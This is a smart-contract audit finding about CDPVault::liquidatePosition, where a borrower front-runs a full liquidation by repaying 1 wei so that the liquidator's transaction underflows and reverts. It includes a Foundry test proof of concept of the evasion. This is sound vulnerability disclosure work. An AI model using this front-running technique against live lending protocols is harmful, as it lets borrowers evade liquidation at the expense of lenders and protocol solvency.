## [H] Malicious borrower can evade full liquidation in `CDPVault::liquidatePosition` by repaying small amounts of debt

<relative_path_091409:src/CDPVault.sol#L509>

<relative_path_091409:src/CDPVault.sol#L713>

### Impact

In the `CDPVault::liquidatePosition` function, a liquidator can repay the total debt of a position to liquidate it, this can be achieved by calling the `CDPVault::virtualDebt` function to obtain the total debt and then call `CDPVault::liquidatePosition`. However, a malicious borrower can front-run this liquidation transaction by repaying a small amount (e.g., 1 wei) of the debt. This action causes the debt to be slightly less than the amount the liquidator intends to repay. Consequently, the subtraction operation in `CDPVault#L713` will underflow, leading to a revert in the transaction. This will allow borrowers to evade total debt liquidation.

### Proof of Concept

Consider the next scenario:

1. Assume the initial debt is `80 ether`. The position is liquidatable.
2. Liquidator prepares to repay the full debt `80 ether` to liquidate the position via `CDPVault::liquidatePosition`. Liquidator gets the full debt using `CDPVault::virtualDebt` function.
3. Malicious borrower front-runs the transaction and repays `1 wei`, the debt is now `80 ether - 1 wei`.
4. Liquidator's transaction is executed but it attempts to repay `80 ether`, causing an underflow when the `newDebt` is calculated `CDPVault#L713` as `(80 ether - 1 wei) - 80 ether`.

```solidity
File: CDPVault.sol
652:     function calcDecrease(
653:         uint256 amount,
654:         uint256 debt,
655:         uint256 cumulativeIndexNow,
656:         uint256 cumulativeIndexLastUpdate,
657:         uint128 cumulativeQuotaInterest
658:     )
659:         internal
660:         pure
661:         returns (uint256 newDebt, uint256 newCumulativeIndex, uint256 profit, uint128 newCumulativeQuotaInterest)
662:     {
663:         uint256 amountToRepay = amount;
...
...
713:>>>      newDebt = debt - amountToRepay;  // underflow
714:     }
```

The next test demonstrates how the malicious borrower can evade full liquidation by repaying small amounts of the debt.

```solidity
    // File: CDPVault.t.sol
    function test_liquidate_fullliquidation_panicerror() public {
        CDPVault vault = createCDPVault(token, 150 ether, 0, 1.25 ether, 1 ether, 0.95 ether);
        createGaugeAndSetGauge(address(vault));
        // create position
        _modifyCollateralAndDebt(vault, 110 ether, 80 ether);
        // position is liquidatable
        _updateSpot(0.80 ether);
        //
        // 1. Liquidator calculates the full debt in order to call `CDPVault::liquidatePosition`.
        address position = address(this);
        uint256 liquidatorRepayAmount = virtualDebt(vault, position);
        address liquidator = address(0xb0b);
        createCredit(liquidator, liquidatorRepayAmount);
        //
        // 2. Malicious borrower frontrun liquidator and repays 1 wei
        mockWETH.approve(address(vault), 1);
        vault.modifyCollateralAndDebt(address(this), address(this), address(this), 0, -toInt256(1));
        //
        // 3. Liquidator tx is executed but it will be reverted by `arithmeticError`
        vm.startPrank(liquidator);
        mockWETH.approve(address(vault), liquidatorRepayAmount);
        vm.expectRevert(stdError.arithmeticError);
        vault.liquidatePosition(position, liquidatorRepayAmount);
    }
```



